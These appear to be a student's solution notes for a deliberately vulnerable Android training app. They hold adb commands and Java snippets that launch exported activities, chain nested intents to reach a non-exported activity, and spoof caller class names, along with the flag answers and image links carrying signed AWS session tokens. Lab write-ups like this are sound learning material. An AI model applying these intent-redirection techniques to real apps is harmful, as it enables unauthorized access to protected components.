### Flag1
command to start activity
adb shell am start -n io.hex.tree.attacksurface/.activities.Flag1Activity
HXT\{basic-exported-activity-1bh7sd\}
### Flag2
command to start an specific activity with an action
adb shell am start -n io.hextree.attacksurface/.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
HXT\{intent-actions-activity-dsj198w\}
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/539222bf-3e2e-482a-aaf8-b1ffcc790f51/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=f89efb9fa540ce81fc27cbd2cff3c0cb72f4a84e2ca1312ed97bf4c01d522227&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
### Flag3
command to start an specific activity with an action to load an url which is specified in the code
adb shell am start -n io.hextree.attacksurface/.activities.Flag3Activity -a io.hextree.action.GIVE_FLAG -d "[https://app.hextree.io/map/android](https://app.hextree.io/map/android)"
HXT\{intent-uri-data-sda982bs\}
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/e6def04d-7655-424d-9d19-24fab397ce35/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=70befa06b40f9e04b27006c5d44ef77d9161997b31c83aa5962b0518786ba29e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
<empty-block/>
### Flag4
The `enum State` defines five possible "modes" the Activity can be in. To get the flag, you must move through them in this exact order:
1. **INIT** (Start)
2. **PREPARE**
3. **BUILD**
4. **GET_FLAG** (The Win Condition)
5. **REVERT** (A fallback state)
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/4490b1d4-9838-49c4-8b5f-89bc627bcc1d/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=2575a06ab09f4aec54652441be18913d5d6a2b82c96b475ef3f66c035968e07e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The `stateMachine()` method is the brain of this Activity. It looks at two things every time it runs:
- **What state are we in right now?** (Stored in `SolvedPreferences` which is a type of shared preferences)
- **What "Action" did you just send?** (Passed via an `Intent`)
If you send the right **Action** for your current **State**, you move to the next level:
- **If State = INIT:** You must send an Intent with the action `"PREPARE_ACTION"`.
- **If State = PREPARE:** You must send an Intent with the action `"BUILD_ACTION"`.
- **If State = BUILD:** You must send an Intent with the action `"GET_FLAG_ACTION"`.
- **If State = GET_FLAG:** The code runs `success(this)` and gives you the flag!
so its like opening an activity one after another so the commands are
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION<br>adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity<br>
### Flag 5
- **Start ****`Flag5Activity`**: You launch the main **Intent** to open the screen.
- **Provide ****`intent2`**: Inside that main Intent, you must include a nested Intent (`intent2`) that contains the number **42**.
- **Include ****`nextIntent`**: Inside `intent2`, you must nest a third Intent (`nextIntent`).
- **Set the Trigger**: Inside `nextIntent`, you must set the "reason" to **"back"**.
- **The Result**: The Activity unpacks this entire chain and runs the `success()` function.
So the code should be in reverse way to launch the success() in newIntent 
```java
Intent nextIntent = new Intent();
nextIntent.putExtra("reason", "back");
Intent intent2 = new Intent();
intent2.putExtra("return", 42);
intent2.putExtra("nextIntent", nextIntent);
Intent exploitIntent = new Intent();
exploitIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
exploitIntent.putExtra("android.intent.extra.INTENT", intent2);
startActivity(exploitIntent);
```
<empty-block/>
### Flag7
In order to acquire this flag we need to know about what is onNewIntent because sucess method is inside `onNewIntent(Intent intent)` and not inside `onCreate` method
What is onNewIntent and why its used instead of onCreate?
onNewIntent is a method which consists of singleTop mode which prevents from the ui to load multiple times for a single intent which costs low ram , it uses previous ui of that activity instead if creating a new one like onCreate 
SingleTop is a mode which reuses the ui of previous activity<br>what happens if everyone uses onNewIntent instead of onCreate?
when user click back button we would close the whole app instead of closing that single screen
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/66335889-0f6d-494f-9170-5c6f65a77785/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=4798bffcf14eada4b46f753c124fdc4d37d48e66d49a627d6cd129019c6cb5c8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/d2750843-880c-49f1-9111-88a622687c82/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=9d5a6e51d1207b9821ee9f324094746811a4cee5f0cf9e1d80a6d766ca8bcb01&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
<empty-block/>
and the code specifies us to we have to first intent should have action `OPEN` and our second intent should have flag `FLAG_ACTIVITY_SINGLE_TOP` beacuse its in onNewIntent and action `REOPEN`  so i wrote the code in this way
we are sending the intent to io hex tree from this code
```java
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity"));
        intent.setAction("OPEN");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        intent.setAction("REOPEN");
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(intent);
        finish();
```
<empty-block/>
### Flag 6
Flag 6 is is not exported so other apps cant interact with it but we can interact with it using flag5 since its sending an intent to flag6
this challenge is related to flag5 activity where the if and else where the else sends the activity to flag activity 6 which we can confirm by this code below
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/93538ff9-0523-4ad7-9d18-3e8336e088c4/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=3dda2f2c845161805817aa46b2a1805f12dfbbd4fd3dbce3ec0c77ec775b8502&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
the below code first starts flag5 activity which we previously discussed about the nested intent and finally the incoming intent of flag6 activity should have the flag  `FLAG_GRANT_READ_URI_PERMISSION` and the value of this flag is 1
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/b26795b8-7673-48ba-863b-177752c91a5a/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=12c61956a4cc1e34033f36a1e5b163d5e26a919d31f5079595e54f1ca8c4cd1b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above code snipper indicates the flag6 activity and its performing a boolean and operation with the flag we sent
```java
        Intent flag6Intent = new Intent();
        flag6Intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
        flag6Intent.putExtra("reason", "next");
        flag6Intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        Intent flag5 = new Intent();
        flag5.putExtra("return", 42);           
        flag5.putExtra("nextIntent", flag6Intent);
        Intent launch = new Intent();
        launch.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
        launch.putExtra("android.intent.extra.INTENT", flag5);
        startActivity(launch);
        finish();
```
In this way we can start an activity which is set exported activity is false if one activity is the reason to star another activity through intents
<empty-block/>
### Flag8
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/2c0a7fb7-2a9d-4e1b-a7fd-1b1a08fecde5/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=8e9b07848e3e278e44e5c7ccf278b3ea620a853b919a3235961a24cc4c7d6e94&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
- In this activity we need to call the activity using `startActivityForResult()` from our attack app 
- Also, it checks the name of the class from which the intent is sent because the above snapshot of code uses getClassName(), and it should contain "Hextree" so our activity name should be Flag9Hextree or anyother class name that contains Hextree
- getCallingActivity() is used when a intent is launched with expecting result back and wants to know which activity launched the intent ( where we used` startActivityForResult()` in our attack app)
Hence the code is used to attack the app is
```java
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity"));
        startActivityForResult(intent, 42);
    }
}
```
Basic info of the above solution
1. **`setComponent`** to address the Hextree app.
2. **`startActivityForResult`** to send the request along with the component name(class name)
3. **`getCallingActivity`** to check your "ID." and gets the request
4.  **`setResult`** to pack the flag.
5. **`onActivityResult`** to catch and show the flag back again to the creator of startActivityForResult
<empty-block/>
### Flag9
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/425d460a-b06a-4f16-8b5d-b461b5809f66/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2C